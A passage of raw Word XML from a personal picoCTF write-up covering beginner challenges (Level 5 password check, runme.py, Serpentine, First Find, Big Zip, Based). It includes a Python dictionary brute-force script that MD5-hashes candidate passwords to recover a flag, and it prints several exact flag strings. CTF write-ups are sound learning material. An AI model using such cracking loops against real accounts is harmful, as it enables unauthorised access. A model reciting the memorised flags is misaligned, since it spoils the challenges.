            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>hash</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too. Here's a </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>dictionary</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> with all possible passwords based on the password conventions we've seen so far.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5493231C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB6CDBA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ python3 level5.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFF2945" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{h45h_sl1ng1ng_36e992a6}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDF0798" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>9581</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30332FA8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36B806EA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">use readlines to get each password </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEE1267" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">#'ff97\n'  with a new line </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6444D9A0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
        <w:t>To get rid of \n , use python slice [start:end]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405DB1A8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>flag_enc = open('level5.flag.txt.enc', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65754E66" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>correct_pw_hash = open('level5.hash.bin', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D8D1F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>pos_pw_list = open('dictionary.txt','r').readlines()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2BD7F3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F083828" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def hash_pw(pw_str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195F16D3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    pw_bytes = bytearray()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFB4A48" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    pw_bytes.extend(pw_str.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165D9DC0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    m = hashlib.md5()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20799051" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    m.update(pw_bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A2246D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    return m.digest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515C61DB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def level_5_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6022FCED" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    #user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394DFF4B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>for user_pw in pos_pw_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0047A901" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="582B4D26" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">        user_pw = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw[0:4]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103B9715" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        user_pw_hash = hash_pw(user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591FAE2F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        if( user_pw_hash == correct_pw_hash ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6A2BB3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            #print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171B37B7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            decryption = str_xor(flag_enc.decode(), user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A35181D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EABF97" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            print(user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C4E065" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE142AE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    #print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C7EBB2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>level_5_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A9E761" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="491E344D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>runme.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C9536D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14925431" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB49C3D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Author: Sujeet Kumar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DAB217" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEF05B5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>runme.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> script to get the flag. Download the script with your browser or with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the webshell. </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download runme.py Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BBAB312" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>wget https://artifacts.picoctf.net/c/86/runme.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14746380" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{run_s4n1ty_run}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5019F48C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC790E7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="190EB2EE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Serpentine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F31319" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F30A096" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078D9A06" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5A91A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5392735B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Find the flag in the Python script! </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34605309" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">wget </w:t>
      </w:r>
      <w:hyperlink>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>https://artifacts.picoctf.net/c/94/serpentine.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E5E461A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">change serpentine.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B43860" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>call function print_flag() in code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E38820" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>elif choice == 'b':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EA17E1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:tab/>
        <w:t>print_flag()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A2EDEE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="308E791C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>First Find</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C9031B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E891E25" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D56242B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB65E56" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4DE57A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unzip this archive and find the file named 'uber-secret.txt' </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26696A2A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
      </w:pPr>
      <w:hyperlink r:id="rId29" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download zip file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351A9604" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>$ upzip files.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F9D93D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>$ find ./ -name uber-secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270FE56F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>./adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E198DC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>caro@ubuntu:~/Downloads/files$ cat ./adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B1F8FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{f1nd_15_f457_ab443fd1}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA96C7C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Big Zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B38679" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223A96FE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBF493E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1169A77E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4B49B1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unzip this archive and find the flag. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C56D8A0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
      </w:pPr>
      <w:hyperlink r:id="rId30" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download zip file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC15D59" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads/files/big-zip-files$ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>grep -ri "picoCTF{" ./</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4726F679" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>./folder_pmbymkjcya/folder_cawigcwvgv/folder_ltdayfmktr/folder_fnpfclfyee/whzxrpivpqld.txt:information on the record will last a billion years. Genes and brains and books encode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> picoCTF{gr3p_15_m4g1c_ef8790dc}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCA6350" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B50C85C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">grep -r recursive   -i ignore case </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25233229" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52482656" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Based</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F38A1C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0617FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD2E0C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Alex Fulton/Daniel Tunitis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17064861" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67135E0B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc jupiter.challenges.picoctf.org 29221</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0BBDA9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ nc jupiter.challenges.picoctf.org 29221</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7677EB49" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Let us see how data is stored</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718A4920" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>lime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61244955" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
